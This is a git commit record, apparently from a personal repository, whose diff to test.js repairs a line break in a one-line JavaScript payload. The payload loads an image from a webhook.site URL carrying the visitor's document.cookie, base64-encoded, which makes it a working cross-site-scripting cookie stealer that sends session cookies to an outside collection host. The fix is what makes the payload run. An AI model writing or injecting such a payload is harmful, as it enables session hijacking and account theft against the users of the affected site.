8630722da5f8d5ad5895926b703d2e7f552c09ef
NabilKara <114018138+NabilKara@users.noreply.github.com>
2025-10-08 13:38:10 +0100

    fixed file

--- test.js
+++ test.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/b424a1ca-0efb-4504-949a-f71271ce2292?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/b424a1ca-0efb-4504-949a-f71271ce2292?data='+btoa(document.cookie);
